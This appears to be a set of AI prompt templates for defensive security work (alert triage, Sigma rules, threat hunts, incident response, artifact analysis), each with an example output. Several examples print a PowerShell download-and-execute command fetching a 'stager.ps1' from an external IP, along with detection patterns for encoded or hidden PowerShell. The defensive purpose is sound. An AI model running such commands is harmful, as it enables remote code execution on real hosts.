prompts.title: Alert Triage Assistant
prompts.use_case: Triage a raw alert or log snippet and return a structured analyst verdict with MITRE mapping and next steps
prompts.author: hrushikesh-badgujar
prompts.limitations: Verdict accuracy depends on alert context richness — sparse alerts produce low-confidence outputs. Always apply analyst judgment before escalating or suppressing.
prompts.prompt:
You are a SOC analyst with L2 experience performing structured alert triage.

Alert to triage:
{PASTE THE RAW ALERT, LOG LINES, OR SIEM NOTIFICATION HERE}

Analyze the alert and return ONLY the following structure. Do not add any other text.

VERDICT: [Malicious / Likely Malicious / Suspicious / Likely Benign / Benign]
CONFIDENCE: [High / Medium / Low]
REASON: [One sentence explaining the verdict]

MITRE TTPs:
- [T####.###]: [Technique Name]

SUMMARY:
[2-3 sentences describing what likely happened, what asset is at risk, and why this matters]

NEXT STEPS:
1. [Immediate action]
2. [Investigation step]
3. [Containment or follow-up]

SUPPRESSION CRITERIA: [Exact conditions under which this alert can be safely suppressed — or "Do not suppress"]

ESCALATE: [Yes / No] — [One-line reason]
prompts.example_output:
VERDICT: Likely Malicious
CONFIDENCE: Medium
REASON: PowerShell downloading a remote payload via IEX is a well-established execution pattern rarely seen in legitimate workflows.

MITRE TTPs:
- T1059.001: PowerShell
- T1105: Ingress Tool Transfer

SUMMARY:
A PowerShell process on WKSTN-042 executed an IEX(DownloadString) command pulling content from an external IP (185.220.x.x). The external IP falls in a Tor exit node range, suggesting deliberate obfuscation. The target is an end-user workstation that may now have a foothold established.

NEXT STEPS:
1. Isolate WKSTN-042 from the network immediately
2. Pull the full PowerShell command-line history and child process tree
3. Check for persistence — scheduled tasks, registry run keys, new accounts created in the past 24h

SUPPRESSION CRITERIA: Do not suppress — active download behavior to Tor infrastructure warrants investigation regardless of frequency.

ESCALATE: Yes — active potential compromise with network isolation required

variants.prompt:
You are a Tier 2 SOC analyst performing structured alert triage.

Alert:
{PASTE THE RAW ALERT HERE}

Return your analysis in this exact format only — no preamble, no commentary:

VERDICT: [Malicious / Likely Malicious / Suspicious / Likely Benign / Benign]
CONFIDENCE: [High / Medium / Low]
REASON: [One sentence]
MITRE TTPs: [comma-separated T#### IDs and names]
SUMMARY: [2-3 sentences]
NEXT STEPS: [numbered list, max 3]
SUPPRESSION CRITERIA: [one line or "Do not suppress"]
ESCALATE: [Yes/No — one-line reason]
variants.notes: GPT-4o adds a preamble before VERDICT — "no preamble, no commentary" reduces it. Still sometimes reformats the MITRE field, watch for it.

prompts.title: Sigma Rule Generator
prompts.use_case: Generate a valid Sigma rule from a plain-English description of an attack behavior
prompts.author: hrushikesh-badgujar
prompts.limitations: Hallucinates field names for uncommon log sources — always validate detection fields against your SIEM schema before deployment
prompts.prompt:
You are a detection engineer with deep expertise in Sigma rule authoring.

Attack behavior to detect:
{DESCRIBE THE ATTACK BEHAVIOR IN PLAIN ENGLISH}

Write a valid Sigma rule that detects this behavior. Follow these requirements exactly:
- Use standard Sigma YAML structure: title, id, status, description, references, author, date, tags, logsource, detection, falsepositives, level
- Set status to "experimental"
- Choose the most specific logsource available (product, service, or category)
- Write detection logic using keywords, selection, and condition fields
- Use field names from common log sources (Windows Event Log, Sysmon, auditd, etc.)
- Include at least two realistic false positive scenarios
- Set an appropriate level: informational | low | medium | high | critical
- Add MITRE ATT&CK tags in format: attack.tXXXX and attack.tactic

Output ONLY the Sigma rule in YAML. No explanation, no markdown fences, no commentary.
prompts.example_output:
title: Suspicious PowerShell Encoded Command Execution
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
status: experimental
description: Detects execution of PowerShell with base64-encoded commands, commonly used by attackers to obfuscate malicious payloads
references:
  - https://attack.mitre.org/techniques/T1059/001/
author: hrushikesh-badgujar
date: 2026/05/19
tags:
  - attack.execution
  - attack.t1059.001
  - attack.defense_evasion
  - attack.t1027
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\powershell.exe'
    CommandLine|contains:
      - '-EncodedCommand'
      - '-enc '
      - '-ec '
  condition: selection
falsepositives:
  - Legitimate administrative scripts using encoded commands
  - Software installers that invoke encoded PowerShell during setup
level: medium

variants.prompt:
You are a detection engineer. Generate a Sigma rule to detect the following attack behavior:

{DESCRIBE THE ATTACK BEHAVIOR IN PLAIN ENGLISH}

Rules:
1. Use valid Sigma YAML format with all required fields
2. status: experimental
3. Include realistic MITRE ATT&CK tags (attack.tXXXX)
4. Use specific logsource — do not use "generic"
5. Write a condition that minimizes false positives
6. List two false positive scenarios
7. Output ONLY the YAML. No explanation.
variants.notes: GPT-4o adds markdown code fences and preamble by default — the explicit "Output ONLY the YAML" helps but still verify field names against your schema.

variants.prompt:
Task: Write a Sigma detection rule for the attack behavior below.

Attack behavior:
{DESCRIBE THE ATTACK BEHAVIOR IN PLAIN ENGLISH}

Output format — return ONLY this YAML structure, nothing else:

title: [rule title]
id: [generate a UUID]
status: experimental
description: [one sentence]
tags:
  - attack.[tactic]
  - attack.t[technique_id]
logsource:

  product: [windows|linux|macos]

    [field]: [value]

variants.notes: Llama adds prose between YAML fields without an explicit skeleton. Providing the structure directly produces clean output.

prompts.author: hrushikesh-badgujar

prompts.title: Threat Hunt Hypothesis Generator
prompts.use_case: Generate structured, testable hunting hypotheses from a TTP ID or threat actor behavior
prompts.author: hrushikesh-badgujar
prompts.limitations: Hypotheses are only as specific as the input — vague TTP descriptions produce generic output. Data source assumptions target common enterprise stacks; verify field availability in your SIEM before hunting.
prompts.prompt:
You are a senior threat hunter with expertise in hypothesis-driven hunting.

TTP or threat behavior to hunt:
{PASTE TTP ID, TECHNIQUE NAME, OR THREAT ACTOR BEHAVIOR HERE}

Generate structured hunting hypotheses for this technique. Return ONLY the following structure. Do not add any other text.

HUNT SCOPE: [Endpoint / Network / Cloud / Identity / Multi-domain]
TECHNIQUE: [T####.###] [Technique Name]

HYPOTHESES:
1. [Testable — "If [actor behavior], then [observable evidence] in [data source]"]
2. [Second hypothesis]
3. [Third hypothesis]

DATA SOURCES REQUIRED:
- [Log source: specific field or event ID needed — one per line]

BASELINE QUESTIONS:
- [What is normal for this data source in your environment?]
- [What threshold distinguishes noise from signal?]

KQL HUNT QUERY:
[1-2 KQL queries targeting the primary hypothesis]

SIGMA CONDITION:
[1 Sigma-style detection condition for correlation rules]

SUCCESS CRITERIA: [What observable finding confirms the hypothesis — or rules it out]

LOOKBACK WINDOW: [Recommended time range and why]
prompts.example_output:
HUNT SCOPE: Endpoint
TECHNIQUE: T1059.001 PowerShell

HYPOTHESES:
1. If an attacker uses PowerShell for lateral movement, then encoded command executions spawned by remote management services (WinRM, WMI) will appear in process creation logs on non-admin workstations.
2. If PowerShell is used for C2 communication, then outbound connections from powershell.exe to non-CDN IPs on ports 443/80 without a matching browser process will appear in network logs.
3. If PowerShell is used for credential access, then LSASS reads by a PowerShell child process will appear in Sysmon Event ID 10 logs within 10 minutes of PowerShell execution.

DATA SOURCES REQUIRED:
- Windows Security Event ID 4688 (process creation with command line auditing enabled)
- Sysmon Event ID 1 (process creation), 3 (network connection), 10 (process access)
- EDR telemetry: parent-child process trees

BASELINE QUESTIONS:
- What is the normal rate of PowerShell execution per day per endpoint in your environment?
- Which teams (IT, DevOps) legitimately use encoded commands — and from which hosts?

KQL HUNT QUERY:
DeviceProcessEvents
| where FileName =~ "powershell.exe"
| where InitiatingProcessFileName in~ ("wmiprvse.exe", "wsmprovhost.exe", "svchost.exe")
| where ProcessCommandLine has_any ("-EncodedCommand", "-enc ", "-ec ", "IEX", "DownloadString")
| where DeviceId !in (allowlisted_admin_hosts)
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName

SIGMA CONDITION:
selection:
  Image|endswith: '\powershell.exe'
  ParentImage|endswith:
    - '\wmiprvse.exe'
    - '\wsmprovhost.exe'
  CommandLine|contains:
    - '-EncodedCommand'
    - 'IEX'
condition: selection

SUCCESS CRITERIA: At least one PowerShell process with encoded commands spawned by a remote management parent on a non-admin workstation — corroborate with network logs showing outbound connection within the same session.

LOOKBACK WINDOW: 30 days — covers most C2 dwell times while keeping query performance manageable.

prompts.title: Incident Response Action Plan
prompts.use_case: Generate a structured IR action plan with containment, eradication, and recovery steps for a given incident type
prompts.author: hrushikesh-badgujar
prompts.limitations: Steps are general — adapt to your environment, tooling, and IR policy. Does not replace an approved IR playbook or legal/compliance sign-off on containment actions. Always loop in management before isolating production systems.
prompts.prompt:
You are an incident responder with experience handling enterprise security incidents.

Incident details:
{DESCRIBE THE INCIDENT: type, affected systems, initial indicators, timeline if known}

Generate a structured IR action plan. Return ONLY the following structure. Do not add any other text.

INCIDENT TYPE: [Ransomware / Credential Theft / Data Exfiltration / Insider Threat / Phishing / C2 Beaconing / Other]
SEVERITY: [P1-Critical / P2-High / P3-Medium / P4-Low]
CURRENT PHASE: [Detection / Containment / Eradication / Recovery / Post-Incident]

IMMEDIATE ACTIONS (first 30 minutes):
1. [Action — who does it, what tool, why]
2.
3.

EVIDENCE PRESERVATION (before containment changes state):
- [What to collect and where to store it]

CONTAINMENT STEPS:
1. [Specific action with rollback consideration]
2.
3.

ERADICATION STEPS:
1. [Specific removal or remediation action]
2.

RECOVERY STEPS:
1. [Validated restoration action]
2.

STAKEHOLDER NOTIFICATIONS:
- [Who to notify, when, and what to tell them — CISO, Legal, HR, PR, regulator]

IOC WATCHLIST: [Indicators to block in SIEM/EDR/firewall immediately — one per line]

DO NOT DO: [Common mistakes for this incident type that make the situation worse]
prompts.example_output:
INCIDENT TYPE: C2 Beaconing
SEVERITY: P2-High
CURRENT PHASE: Containment

IMMEDIATE ACTIONS (first 30 minutes):
1. Analyst: Pull full network flow for the beaconing host from the past 72h — identify all external IPs contacted and flag consistent-interval connections (jitter <5%)
2. SOC Lead: Open P2 incident ticket, assign IR lead, notify on-call CISO via Slack
3. Network: Block the known C2 IP/domain at the perimeter firewall — do NOT isolate the host yet to preserve beacon timing for forensics

EVIDENCE PRESERVATION (before containment changes state):
- Memory dump of the affected host (Volatility-compatible) before rebooting or isolating
- Full process tree snapshot from EDR at time of detection
- Raw PCAP of the last 4 hours of outbound traffic from the host
- Event logs (Security, System, PowerShell operational) exported to SIEM case

CONTAINMENT STEPS:
1. Isolate the host at the network switch level (VLAN quarantine) — preserve the machine state for forensics
2. Disable the user account associated with the compromised host in Active Directory
3. Rotate any credentials the user had access to — VPN, email, shared service accounts

ERADICATION STEPS:
1. Identify the malware dropper via EDR process tree and file hash — compare against VirusTotal
2. Remove persistence mechanisms: scheduled tasks, registry run keys, new services, startup folders
3. Scan all hosts with the same user or lateral movement path for matching IOCs

RECOVERY STEPS:
1. Reimage the affected host from a known-clean golden image — do not restore from backup taken after infection date
2. Re-enroll the host in EDR and confirm telemetry is flowing before returning to production

STAKEHOLDER NOTIFICATIONS:
- CISO: Immediate — severity, affected systems, containment status
- Legal: Within 2h if data exfiltration is suspected — preserve chain of custody
- IT Manager: Coordinate host isolation window to minimize business impact
- HR: Only if insider threat indicators are present

IOC WATCHLIST:
185.220.101.45 — known C2 IP
update-service[.]net — C2 domain
SHA256: a3f1b2c4... — dropper hash

DO NOT DO:
- Do not reboot the host before taking a memory dump — volatile C2 artifacts will be lost
- Do not block the C2 IP before collecting timing data — you lose the ability to track dwell time
- Do not notify the user until Legal has reviewed — premature disclosure can trigger evidence destruction in insider threat cases

prompts.title: Log Artifact Analyzer
prompts.use_case: Analyze a suspicious command line, script, log entry, or encoded string for malicious indicators and technique attribution
prompts.author: hrushikesh-badgujar
prompts.limitations: Static analysis only — cannot execute or detonate code. May miss multi-layer obfuscation requiring runtime evaluation. Always sandbox-detonate confirmed malicious artifacts before relying solely on this output.
prompts.prompt:
You are a malware analyst and forensic investigator performing static artifact analysis.

Artifact to analyze:
{PASTE THE COMMAND LINE, SCRIPT, LOG ENTRY, OR ENCODED STRING HERE}

Analyze the artifact and return ONLY the following structure. Do not add any other text.

ARTIFACT TYPE: [Command Line / PowerShell Script / Batch / Bash / Encoded Payload / Log Entry / Other]
VERDICT: [Malicious / Likely Malicious / Suspicious / Likely Benign / Benign]
CONFIDENCE: [High / Medium / Low]
REASON: [One sentence explaining the verdict]

BREAKDOWN:
[Step-by-step parsing — decode base64, expand variables, trace execution flow, one step per line]

CAPABILITIES IDENTIFIED:
- [Specific capability, e.g., "Downloads remote payload from external URL"]

MITRE TTPs:
- [T####.###]: [Technique Name] — [How it maps to this artifact]

INDICATORS EXTRACTED:
- IPs / Domains: [one per line or "None"]
- File Paths: [one per line or "None"]
- Registry Keys: [one per line or "None"]
- Hashes: [one per line or "None"]

RISK FACTORS: [What makes this artifact high or low risk in context]

RECOMMENDED ACTIONS:
1. [Immediate analyst action]
2. [Follow-up investigation step]

DETECTION OPPORTUNITY: [Log source + field + value pattern that would catch this artifact at scale]
prompts.example_output:
ARTIFACT TYPE: PowerShell Command Line
VERDICT: Likely Malicious
CONFIDENCE: High
REASON: The command downloads and executes a remote script in-memory via IEX(DownloadString), a pattern with no legitimate administrative use in standard enterprise environments.

BREAKDOWN:
1. powershell.exe -nop -w hidden -enc — launches PowerShell with no profile, hidden window, encoded command
2. Base64 decode of encoded payload: IEX(New-Object Net.WebClient).DownloadString('http://185.220.x.x/stager.ps1')
3. IEX executes the downloaded content directly in memory — no file written to disk
4. Destination IP (185.220.x.x) is in a Tor exit node range

CAPABILITIES IDENTIFIED:
- Remote payload download over HTTP
- In-memory execution (fileless — evades file-based AV)
- Anti-forensic flags: no profile load (-nop), hidden window (-w hidden)

MITRE TTPs:
- T1059.001: PowerShell — primary execution method
- T1105: Ingress Tool Transfer — downloads stager from external IP
- T1027: Obfuscated Files or Information — base64-encoded command

INDICATORS EXTRACTED:
- IPs / Domains: 185.220.x.x
- File Paths: None (fileless execution)
- Registry Keys: None
- Hashes: None (payload not on disk)

RISK FACTORS: Tor exit node destination, fileless execution, hidden window — all three together indicate deliberate evasion. No legitimate tooling uses this pattern.

RECOMMENDED ACTIONS:
1. Isolate the originating host immediately and preserve memory before rebooting
2. Pull full process tree from EDR — identify what spawned powershell.exe and what child processes it created

DETECTION OPPORTUNITY:
Sysmon Event ID 1 — CommandLine contains "-enc" AND "-nop" AND "-w hidden" on the same powershell.exe invocation.
KQL: DeviceProcessEvents | where FileName =~ "powershell.exe" | where ProcessCommandLine has_all ("-enc", "-nop", "-w hidden")

prompts.title: Bulk Change Rollout Gate
prompts.use_case: Force an AI coding assistant to pilot a change on one page/repo and get confirmation before applying it across many pages or repos
prompts.author: hrushikesh-badgujar
prompts.limitations: Only guards against mistakes visible in the pilot target — a change that behaves differently on a later page/repo (different markup, different existing state) can still slip through after confirmation. Doesn't replace testing each target after rollout.
prompts.prompt:
When I ask for the same change across multiple pages or repos, do not apply it everywhere at once.

1. Pick one representative page/repo and apply the change there first.
2. Show me exactly what changed (diff or description).
3. Stop and ask me to confirm it's correct before touching anything else.
4. Only after I explicitly confirm, apply the identical change across the remaining targets: {LIST OF PAGES/REPOS}.

Change to apply: {DESCRIBE THE CHANGE}
prompts.example_output:
Applied to PIVEX/index.html first (pilot target):
- Added `<meta name="theme-color" content="#00d4ff">` to <head>

Diff:
+ <meta name="theme-color" content="#00d4ff">

Correct? Reply to confirm before I roll this out to the remaining 12 repos (X-VERDIKT, IOC-VERDIKT, HYPOS, TRACERULES, ...).

variants.notes: GPT-4o is more likely to proceed straight to bulk application if the confirmation step isn't stated as a hard rule up front — phrasing it as "Rule:" instead of a request reduces skip-ahead behavior.
